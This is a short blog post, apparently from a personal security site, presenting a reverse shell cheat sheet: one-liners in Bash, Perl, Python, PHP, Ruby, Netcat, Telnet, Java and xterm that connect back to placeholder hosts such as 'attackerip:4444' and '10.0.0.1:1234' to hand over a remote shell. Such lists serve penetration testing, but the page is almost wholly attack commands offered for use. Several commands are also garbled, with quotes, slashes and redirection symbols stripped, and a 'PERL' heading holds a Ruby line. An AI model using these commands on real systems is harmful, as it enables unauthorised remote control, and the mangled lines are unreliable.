---
layout: single
title: Reverse Shell Cheat Sheet
excerpt: "List of reverse shell commands."
date: 2020-04-28
classes: wide
header:
  teaser: /assets/images/rev-shell-cheat-sheet/rev-shell-001.png
  teaser_home_page: true
  icon: /assets/images/thumbs-up-icon.png
categories:
  - cheat sheet
tags:
  - reverse shell
---

![](/assets/images/rev-shell-cheat-sheet/rev-shell-001.png)

## References
Pentestmonkey
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


## Bash

```
bash -i & devtcp10.0.0.18080 0&1
```

```
exec /bin/bash 0&0 2>&0
```

```
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
while read line 0<&5; do $line 2>&5 >&5; done
```

## PERL

```
perl -e 'use Socket;$i=10.0.0.1;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&S);open(STDOUT,&S);open(STDERR,&S);exec(binsh -i);};'
```

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.0.0.1,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([binsh,-i]);'
```

## PHP

```php
php -r '$sock=fsockopen(10.0.0.1,1234);exec(binsh -i &3 &3 2&3);'
```

## Ruby

```
ruby -rsocket -e'f=TCPSocket.open(10.0.0.1,1234).to_i;exec sprintf(binsh -i &%d &%d 2&%d,f,f,f)'
```

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PERL

```
ruby -rsocket -e'f=TCPSocket.open(10.0.0.1,1234).to_i;exec sprintf(binsh -i &%d &%d 2&%d,f,f,f)'
```

## Netcat

```
nc -e binsh 10.0.0.1 1234
```

```
nc -c /bin/sh attackerip 4444
```

```
/bin/sh | nc attackerip 4444
```

```
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```

## Telnet

```
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
```

```
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
```

## Java

```
r = Runtime.getRuntime()
p = r.exec([binbash,-c,exec 5devtcp10.0.0.12002;cat &5  while read line; do $line 2&5 &5; done] as String[])
p.waitFor()
```

## xterm

```
xterm -display 10.0.0.11
Xnest 1
```
